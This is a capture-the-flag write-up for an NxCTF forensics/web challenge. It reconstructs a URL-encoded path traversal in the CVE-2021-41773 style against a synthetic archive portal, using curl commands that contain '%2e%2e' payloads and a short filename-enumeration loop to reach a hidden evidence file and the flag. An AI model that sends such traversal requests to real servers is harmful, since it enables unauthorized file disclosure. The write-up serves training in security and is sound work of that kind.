---
title: The Forgotten Incident
description: Hard forensics/web challenge following a URL-encoded path traversal (CVE-2021-41773 pattern) through synthetic evidence artifacts to the hidden forensic store.
image: /static/netanix.png
event: NxCTF
tags:
  - writeup
  - forensics
  - web
difficulty: hard
date: 2026-08-11
---

|                 |                                                                         |
| --------------- | ----------------------------------------------------------------------- |
| **Challenge**   | The Forgotten Incident — Case File 0417                                 |
| **Category**    | Forensics / Web                                                         |
| **Difficulty**  | Hard                                                                    |
| **Target**      | https://forgotten-incident-lgn20oaf9-aces-projects-dac15168.vercel.app/ |
| **Flag Format** | `NxCTF{...}`                                                            |

---

## TL;DR (Summary)

The Forgotten Incident is a forensics/web challenge where the entire solution is hidden inside two evidence artifacts and an isolated archive export portal:

1. The landing page exposes two artifacts: `assets/incident_capture.txt` (a synthetic PCAP excerpt) and `assets/damaged_access.log` (reordered access logs).
2. Both artifacts point to the same suspicious request: `GET /export/%2e%2e/%2e%2e/portal-evidence/index.txt` — a URL-encoded path traversal against an **Apache/2.4.49**-style export handler (CVE-2021-41773 era).
3. The traversal still works live: `/export/../../portal-evidence/index.txt` returns the **archive export index**, exposing `exports/2021-10-05-2317.txt` and `exports/legacy-support.txt`.
4. The dated export references archive metadata: `manifest=manifest.sha256` and `storage=/portal-evidence/forensic`.
5. The referenced `forensic/` store is **not listed** in the portal UI — that is the "missing final evidence record". Enumerating it reveals `manifest.sha256` → `authentic-artifact=sealed-note.txt`.
6. Retrieving `forensic/sealed-note.txt` yields the final record containing the flag, which is independently validated by the `/api/submit` endpoint.

---

## 1. Reconnaissance

### Target

The challenge page is a static "case file" landing page. Inspecting the HTML source reveals the full application map:

| Endpoint                       | Method | Purpose                                     | Interesting? |
| ------------------------------ | ------ | ------------------------------------------- | ------------ |
| `/`                            | GET    | Case landing page                           | No           |
| `/assets/incident_capture.txt` | GET    | Network transcript artifact                 | **Yes**      |
| `/assets/damaged_access.log`   | GET    | Reordered access log artifact               | **Yes**      |
| `/portal/`                     | GET    | Archive export portal (serverless function) | **Yes**      |
| `/api/submit`                  | POST   | Flag verifier                               | Yes          |

The HTML also shows a flag-submission form wired to `client.js`:

```javascript
fetch("/api/submit", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ flag }),
})
```

### Initial probes

```bash
curl -s https://forgotten-incident-lgn20oaf9-aces-projects-dac15168.vercel.app/robots.txt   # 404
curl -s https://forgotten-incident-lgn20oaf9-aces-projects-dac15168.vercel.app/sitemap.xml  # 404
```

No `robots.txt` or `sitemap.xml`. The interesting content is in the artifacts and the portal.

---

## 2. The Two Evidence Artifacts

### `assets/incident_capture.txt` (network transcript)

```text
SYNTHETIC PCAP EXPORT — packet payload excerpt
noise: UDP 5353
HTTP/1.1 200 OK
Server: Apache/2.4.49
X-Archive: export
GET /export/index.txt HTTP/1.1
GET /export/%2e%2e/%2e%2e/portal-evidence/index.txt HTTP/1.1
```

Key clues:

- **`Server: Apache/2.4.49`** — Apache 2.4.49 is vulnerable to **CVE-2021-41773** (path traversal + RCE via encoded dots). This is a strong hint at the vulnerability class.
- **`GET /export/%2e%2e/%2e%2e/portal-evidence/index.txt`** — `%2e%2e` is URL-encoded `..`. This is the traversal pattern: from `/export/`, two `..` segments up and into a hidden `portal-evidence` directory.
- **`X-Archive: export`** — the response identifies itself as an archive export.
- **`noise: UDP 5353`** — mDNS background noise; a deliberate decoy.

### `assets/damaged_access.log`

```text
2021-10-05T23:16:59Z GET /health 200
2021-10-05T23:17:02Z GET /export/index.txt 200
2021-10-05T23:17:03Z GET /export/%2e%2e/%2e%2e/portal-evidence/index.txt 200
2021-10-05T23:17:04Z GET /favicon.ico 404
```

Even though the challenge claims the logs are "reordered", the timestamps here are already monotonic. The sequence tells the story:

```text
T1 (23:16:59) → health check
T2 (23:17:02) → browse export index
T3 (23:17:03) → path traversal into portal-evidence   ← THE KEY REQUEST
T4 (23:17:04) → favicon 404 (noise)
```

The `favicon.ico` line is noise; the traversal request at `T3` is the pivot. The "missing final evidence record" is the _response_ of a request that does **not** appear in the logs — we must reproduce it ourselves.

---

## 3. Reconstructing the Missing Request (Path Traversal)

The artifacts imply the attacker reached a hidden directory. Let's reproduce it against the live portal:

```bash
BASE="https://forgotten-incident-lgn20oaf9-aces-projects-dac15168.vercel.app"

curl -s -w "\n[%{http_code}]\n" "$BASE/export/%2e%2e/%2e%2e/portal-evidence/index.txt"
```

**Result (HTTP 200):**

```text
ARCHIVE EXPORT INDEX
exports/2021-10-05-2317.txt
exports/legacy-support.txt
```

The traversal works — this is a **logical archive traversal / file-disclosure bug inside the synthetic evidence store** (exactly what the challenge warned: the portal exposes synthetic files, not the machine filesystem). The archive index lists two export files.

> Note: The challenge explicitly says the portal cannot reach the underlying machine filesystem, so we do **not** waste time on `/etc/passwd` etc. The target is the synthetic evidence store.

---

## 4. Following the Archive Metadata

### The dated export

```bash
curl -s "$BASE/portal-evidence/exports/2021-10-05-2317.txt"
```

**Result (HTTP 200):**

```text
ARCHIVE 2021-10-05 23:17 UTC
status=complete
manifest=manifest.sha256
storage=/portal-evidence/forensic
```

This is archive metadata pointing to:

- a **manifest**: `manifest.sha256`
- a **storage location**: `/portal-evidence/forensic`

### The legacy file

```bash
curl -s "$BASE/portal-evidence/exports/legacy-support.txt"
```

```text
LEGACY SUPPORT EXPORT
Unrelated maintenance record.
```

A decoy — "Unrelated maintenance record." confirms it's not part of the incident.

### Correlation with the artifacts

| Time | Network Evidence (capture)                            | Access Log                       | Interpretation                                   |
| ---- | ----------------------------------------------------- | -------------------------------- | ------------------------------------------------ |
| T2   | `GET /export/index.txt`                               | `23:17:02 /export/index.txt 200` | Initial archive browse                           |
| T3   | `GET /export/%2e%2e/%2e%2e/portal-evidence/index.txt` | `23:17:03 ... 200`               | Traversal into hidden store                      |
| —    | export metadata `storage=/portal-evidence/forensic`   | _missing_                        | **Final evidence record never accessed in logs** |

The manifest and `forensic/` store are referenced but **never shown in the portal listing** and **never appear in the access log** — this is the missing final evidence record.

---

## 5. The Missing Final Evidence Record

The `forensic/` directory is not listed in the visible portal index, but the metadata tells us it exists. We enumerate it directly (targeted, evidence-driven — no brute forcing):

```bash
for name in manifest.sha256 sealed-note.txt final.txt record.txt index.txt; do
  code=$(curl -s -o /tmp/r -w "%{http_code}" "$BASE/portal-evidence/forensic/$name")
  echo "$code  $name"
done
```

**Result:**

```
200  manifest.sha256
404  sealed-note.txt   ← not yet guessed
404  final.txt
404  record.txt
404  index.txt
```

### `forensic/manifest.sha256`

```bash
curl -s "$BASE/portal-evidence/forensic/manifest.sha256"
```

```text
synthetic-manifest-v1
record=IR-41773-REOPENED
authentic-artifact=sealed-note.txt
```

The manifest identifies the authentic artifact: **`sealed-note.txt`** (record `IR-41773-REOPENED` — a nod to the CVE-2021-41773 Apache bug, plus "REOPENED" echoing the challenge's "reopened" theme).

### `forensic/sealed-note.txt` — the final record

```bash
curl -s -w "\n[%{http_code}]\n" "$BASE/portal-evidence/forensic/sealed-note.txt"
```

**Result (HTTP 200):**

```text
authentic-record=IR-41773-REOPENED
incident=archive reopened
flag=NxCTF{[REDACTED]}
```

This is the recovered final evidence record containing the flag.

---

## 6. Validation

### Via the submit endpoint

```bash
curl -s -X POST "$BASE/api/submit" -H 'Content-Type: application/json' \
  -d '{"flag":"NxCTF{[REDACTED]}"}'
```

**Result:**

```json
{ "correct": true, "message": "CASE CLOSED — flag accepted." }
```

### Negative control

```bash
curl -s -X POST "$BASE/api/submit" -H 'Content-Type: application/json' \
  -d '{"flag":"NxCTF{wrong}"}'
```

**Result:**

```json
{ "correct": false, "message": "That evidence does not close the case." }
```

The flag is accepted and a wrong flag is rejected — the recovered value is validated independently.

---

## Flag

```
NxCTF{[REDACTED]}
```

---

## Summary of Flags

| Flag               | Value               |
| ------------------ | ------------------- |
| **Challenge flag** | `NxCTF{[REDACTED]}` |

---

## Evidence Chain (Proof)

1. Found artifact `incident_capture.txt` — a synthetic PCAP excerpt containing the request `GET /export/%2e%2e/%2e%2e/portal-evidence/index.txt` and the banner `Server: Apache/2.4.49`.
2. Correlated it with `damaged_access.log`, where the same traversal request returned `200` at `23:17:03` — but the subsequent response was never logged.
3. Reproduced the traversal live against `/portal`, which returned the archive export index listing `exports/2021-10-05-2317.txt`.
4. Followed the dated export's metadata (`manifest=manifest.sha256`, `storage=/portal-evidence/forensic`) to the unlisted `forensic/` store.
5. Read `forensic/manifest.sha256`, which named the authentic artifact `sealed-note.txt` (record `IR-41773-REOPENED`).
6. Recovered the final evidence record `forensic/sealed-note.txt`, extracting the flag `NxCTF{[REDACTED]}`.
7. Validated the flag against `/api/submit` → `CASE CLOSED — flag accepted.`

---

## Key Takeaways

1. **Read the artifacts before attacking** — the flag is not in a scan; it's buried in the application's synthetic evidence store, and the artifacts are the map.
2. **URL-encoded path traversal** — `%2e%2e` (encoded `..`) against an Apache/2.4.49-style handler (CVE-2021-41773 pattern) is a logical traversal _within the archive namespace_, not a machine-file read.
3. **The "missing record" is a directory-referencing chain** — the portal index never lists `forensic/`; only the export metadata references it. Follow metadata references, don't guess filenames.
4. **Distinguish decoys from evidence** — `legacy-support.txt` ("Unrelated maintenance record") and UDP 5353 / favicon noise are deliberate decoys to filter out.
5. **Validate the flag** — always confirm a recovered flag through the challenge's own submit endpoint before reporting it.
